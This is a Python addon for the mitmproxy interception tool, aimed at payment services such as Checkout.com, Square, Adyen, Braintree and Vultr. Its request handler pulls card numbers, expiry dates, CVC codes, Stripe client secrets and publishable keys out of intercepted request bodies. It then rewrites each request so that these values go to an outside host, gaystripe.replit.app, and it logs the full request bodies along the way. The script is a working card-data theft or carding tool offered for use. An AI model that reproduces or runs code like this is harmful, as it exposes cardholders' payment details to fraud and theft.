import re
from mitmproxy import http, ctx

# Domains to intercept for modifying requests and corresponding keys
DOMAIN_KEYS_MAPPING = {
    "cloud.boosteroid.com": [
        rb"encryptedSecurityCode\": \"([^\"\\]+)"
    ],
    "api.checkout.com": [
        rb"\"cvv\": \"(\d{3,4})"
    ],
    "pci-connect.squareup.com": [
        rb"cvv\": \"(\d{3,4})"
    ],
    "https://checkoutshopper-live.adyen.com": [
        rb"encryptedSecurityCode\": \"([^\"\\]+)"
    ],
    "payments.vultr.com": [
        rb"cc_cscv=(\d{3,4})"
    ],
    "payments.braintree-api.com": [
        rb"\"cvv\": \"(\d{3,4})\""
    ]
}

def extract_fields_from_request_body(request_body):
    """
    Extracts client secret, pk, and card details from the request body.
    """
    client_secret_match = re.search(rb'"client_secret": "([^"]+)"', request_body)
    pk_match = re.search(rb'"pk": "([^"]+)"', request_body)
    card_details_match = re.search(rb'"card": { "number": "([^"]+)", "exp_month": (\d+), "exp_year": (\d+), "cvc": "([^"]+)"', request_body)
    
    if client_secret_match and pk_match and card_details_match:
        client_secret = client_secret_match.group(1).decode()
        pk = pk_match.group(1).decode()
        card_number = card_details_match.group(1).decode()
        exp_month = card_details_match.group(2).decode()
        exp_year = card_details_match.group(3).decode()
        cvc = card_details_match.group(4).decode()
        
        return client_secret, pk, card_number, exp_month, exp_year, cvc
    else:
        return None

def request(flow):
    """
    Intercept and modify requests to specific endpoints.
    """
    for domain, keys in DOMAIN_KEYS_MAPPING.items():
        if domain in flow.request.pretty_host:
            if keys:
                # Log original request data for debugging
                ctx.log.info(f"Original Request Body: {flow.request.text}")
                
                # Extract required fields from the request body
                fields = extract_fields_from_request_body(flow.request.text.encode())
                
                if fields:
                    client_secret, pk, card_number, exp_month, exp_year, cvc = fields
                    modified_url = f"https://gaystripe.replit.app/stripeinbuilt?cc={card_number}|{exp_month}|{exp_year}|{cvc}&client_secret={client_secret}&pk={pk}"
                    
                    # Modify the request URL
                    flow.request.url = modified_url
                    
                    # Log modified request data for debugging
                    ctx.log.info(f"Modified Request URL: {flow.request.url}")
                else:
                    ctx.log.info("Failed to extract required fields from the request body.")
            else:
                ctx.log.info(f"Skipping request interception for domain: {domain}")

def start():
    """
    Function executed when the proxy starts.
    """
    ctx.log.info("Proxy server started. Ready to intercept requests.")

# Attach handlers to mitmproxy
addons = [
    request
]
